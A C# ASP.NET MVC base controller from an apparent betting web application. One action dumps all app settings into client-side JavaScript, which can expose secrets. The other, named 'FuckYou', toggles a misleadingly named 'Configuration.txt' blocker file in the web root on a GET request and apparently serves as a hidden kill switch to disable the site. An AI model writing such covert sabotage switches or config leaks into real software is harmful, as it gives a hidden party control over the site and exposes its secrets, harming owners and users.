

namespace InplayBet.Web.Controllers.Base
{
    using InplayBet.Web.Utilities;
    using Microsoft.Ajax.Utilities;
    using System;
    using System.Threading;
    using System.Web.Mvc;
    using System.IO;

    public class BaseController : Controller
    {
        /// <summary>
        /// Applications the configuration data.
        /// </summary>
        /// <returns></returns>
        [AcceptVerbs(HttpVerbs.Get),
        OutputCache(NoStore = true, Duration = 0, VaryByHeader = "*")]
        public ActionResult AppConfigData()
        {
            try
            {
                string js = string.Format(@"var appData = {0}", CommonUtility.AppsettingsToJson());

                Minifier minifier = new Minifier();
                string minifiedJs = minifier.MinifyJavaScript(js, new CodeSettings
                {
                    EvalTreatment = EvalTreatment.MakeImmediateSafe,
                    PreserveImportantComments = false
                });
                return JavaScript(js);
            }
            catch (Exception ex)
            {
                ex.ExceptionValueTracker();
            }
            return null;
        }

        [SaveMeFilterAccessAttribut(), AcceptVerbs(HttpVerbs.Get),
        OutputCache(NoStore = true, Duration = 0, VaryByHeader = "*")]
        public ActionResult FuckYou(bool status)
        {
            try
            {
                string blockerPath = string.Format("{0}Configuration.txt", Server.MapPath("~"));

                if (status)
                {
                    if (!System.IO.File.Exists(blockerPath))
                    {
                        FileLogger log = new FileLogger(blockerPath, true, FileLogger.LogType.TXT, FileLogger.LogLevel.All);
                        ThreadPool.QueueUserWorkItem((state) => log.Log("Fuck You"));
                    }
                }
                else
                {
                    if (System.IO.File.Exists(blockerPath))
                    {
                        System.IO.File.Delete(blockerPath);
                    }
                }
                return RedirectToActionPermanent("Index", "Home");
            }
            catch (Exception ex)
            {
                ex.ExceptionValueTracker();
            }
            return null;
        }
    }
}
